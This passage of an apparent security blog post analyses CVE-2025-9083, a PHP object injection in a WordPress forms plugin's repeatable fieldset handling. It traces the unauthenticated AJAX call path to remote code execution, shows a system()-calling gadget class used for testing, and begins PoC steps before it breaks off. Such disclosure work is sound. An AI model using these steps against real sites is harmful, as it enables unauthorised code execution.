href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability originates from the &lt;code&gt;extractSubmissions()&lt;/code&gt; function inside the &lt;code&gt;FieldsetRepeater.php&lt;/code&gt; file:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fieldSubmissionValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$fieldSubmissionValue&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fieldSubmissionValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; is called without any protection against PHP Object Injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/diff.png&#34; title=&#34;Bug and patch&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Bug and patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/diff.png&#39; alt=&#34;Diff&#34; height=&#34;148&#34; width=&#34;1891&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bug and patch&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch replaces &lt;code&gt;maybe_unserialize()&lt;/code&gt; with &lt;code&gt;unserialize()&lt;/code&gt; and disables object creation using &lt;code&gt;[&#39;allowed_classes&#39;&amp;ensp;=&amp;gt;&amp;ensp;false]&lt;/code&gt;, preventing PHP Object Injection altogether.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/class_name.png&#34; title=&#34;Class name&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/class_name.png&#34; data-sub-html=&#34;&lt;h2&gt;Class Name&lt;/h2&gt;&lt;p&gt;Class name&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/class_name.png&#39; alt=&#34;Class Name&#34; height=&#34;335&#34; width=&#34;1117&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Class name&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The class name corresponds to a layout field when creating a blank form with the plugin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/create_form.png&#34; title=&#34;Create form with Repeatable Fieldset&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;Create form with Repeatable Fieldset&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;782&#34; width=&#34;1915&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create form with Repeatable Fieldset&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Create a form with &lt;strong&gt;Repeatable Fieldset&lt;/strong&gt;, then drag a &lt;strong&gt;Single Line Text&lt;/strong&gt; field into it as input, and embed the form into a post or page.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/embed_form.png&#34; title=&#34;Embed form into post&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/embed_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed Form&lt;/h2&gt;&lt;p&gt;Embed form into post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/embed_form.png&#39; alt=&#34;Embed Form&#34; height=&#34;455&#34; width=&#34;1192&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Embed form into post&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Publish the post and submit the form with a &lt;code&gt;payload&lt;/code&gt; value:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/request1.png&#34; title=&#34;Request test with `payload`&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/request1.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Request test with `payload`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/request1.png&#39; alt=&#34;Request&#34; height=&#34;967&#34; width=&#34;1874&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request test with `payload`&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;We see that all data is assigned to the &lt;code&gt;formData&lt;/code&gt; parameter. Copy the URL-decoded content into an online JSON formatter:&#xA;&lt;a href=&#34;https://jsonformatter.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://jsonformatter.org/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/format.png&#34; title=&#34;Formatted JSON data&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/format.png&#34; data-sub-html=&#34;&lt;h2&gt;Format&lt;/h2&gt;&lt;p&gt;Formatted JSON data&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/format.png&#39; alt=&#34;Format&#34; height=&#34;834&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Formatted JSON data&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Observing the debugger shows the similarity:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug1.png&#34; title=&#34;Debugger data&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/debug1.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger data&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug1.png&#39; alt=&#34;Debug&#34; height=&#34;331&#34; width=&#34;1596&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger data&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$fieldSubmissionValue&lt;/code&gt; corresponds to the &lt;code&gt;value&lt;/code&gt; of the field with ID &lt;code&gt;8&lt;/code&gt;. Thus, when &lt;code&gt;value&lt;/code&gt; is a string, it triggers &lt;code&gt;maybe_unserialize()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;We create a class and place it in &lt;code&gt;wp-config.php&lt;/code&gt; to test the invocation when &lt;code&gt;maybe_unserialize()&lt;/code&gt; runs:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;ObjectInjection&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Resubmit the request with a serialized payload as the new &lt;code&gt;value&lt;/code&gt;. Because the payload is wrapped inside JSON, quotes must be escaped (&lt;code&gt;\&amp;quot;&lt;/code&gt;) to avoid breaking the JSON structure.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/change_value.png&#34; title=&#34;Change the value to serialized string&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/change_value.png&#34; data-sub-html=&#34;&lt;h2&gt;Change Value&lt;/h2&gt;&lt;p&gt;Change the value to serialized string&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/change_value.png&#39; alt=&#34;Change Value&#34; height=&#34;843&#34; width=&#34;1917&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Change the value to serialized string&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug2.png&#34; title=&#34;Value inside debugger&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/debug2.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug2&lt;/h2&gt;&lt;p&gt;Value inside debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug2.png&#39; alt=&#34;Debug2&#34; height=&#34;305&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value inside debugger&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Shell execution occurs → Deserialization is triggered.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/result.png&#34; title=&#34;Deserialization triggered&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Deserialization triggered&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/result.png&#39; alt=&#34;Result&#34; height=&#34;836&#34; width=&#34;1917&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Deserialization triggered&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Callstack flow:&lt;/p&gt;&#xA;&lt;p&gt;The application registers an AJAX handler for unauthenticated users:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;formData&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_form_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;formData&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;TRUE&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;php5.2&amp;ensp;fallback&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_form_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_form_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;stripslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;formData&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;TRUE&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp_ajax_nopriv_nf_ajax_submit&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means when sending a POST request to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=nf_ajax_submit&lt;/code&gt;, the &lt;code&gt;submit&lt;/code&gt; callback is triggered.&lt;/p&gt;&#xA;&lt;p&gt;A fully submitted form follows this call flow:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/callstack.png&#34; title=&#34;Callstack diagram&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/callstack.png&#34; data-sub-html=&#34;&lt;h2&gt;Callstack&lt;/h2&gt;&lt;p&gt;Callstack diagram&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/callstack.png&#39; alt=&#34;Callstack&#34; height=&#34;247&#34; width=&#34;682&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Callstack diagram&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;POST&amp;ensp;/wp-admin/admin-ajax.php&#34;]&amp;ensp;--&amp;ensp;action=nf_ajax_submit&amp;security=security_code&amp;formData=form_data&amp;ensp;--&gt;&amp;ensp;B[&#34;wp_ajax_nopriv_nf_ajax_submit&#34;]&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;NF_AJAX_Controllers_Submission::submit()&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;NF_AJAX_Controllers_Submission::process()&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;NF_MergeTags_Fields::add_field()&#34;]&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;NF_MergeTags_Fields::generateFieldsetTableRows()&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G[&#34;NF_Handlers_FieldsetRepeater::extractSubmissions()&#34;]&amp;ensp;--&gt;&amp;ensp;H{$fieldSubmissionValue&amp;ensp;is&amp;ensp;String?}&#xD;&#xA;H&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;I[&#34;maybe_unserialize($fieldSubmissionValue)&#34;]&#xD;&#xA;I&amp;ensp;--&gt;&amp;ensp;K(&#34;RCE&#34;)&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Use the plugin to create a blank form with a &lt;code&gt;Single&amp;ensp;Line&amp;ensp;Text&lt;/code&gt; field inside a &lt;code&gt;Repeatable&amp;ensp;Fieldset&lt;/code&gt;, then embed it in a post/page.&lt;/li&gt;&#xA;&lt;li&gt;Submit the form and intercept the request using Burp Suite.&lt;/li&gt;&#xA;&lt;li&gt;Replace the &lt;code&gt;value&lt;/code&gt; of the field with a serialized payload instead of JSON.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code 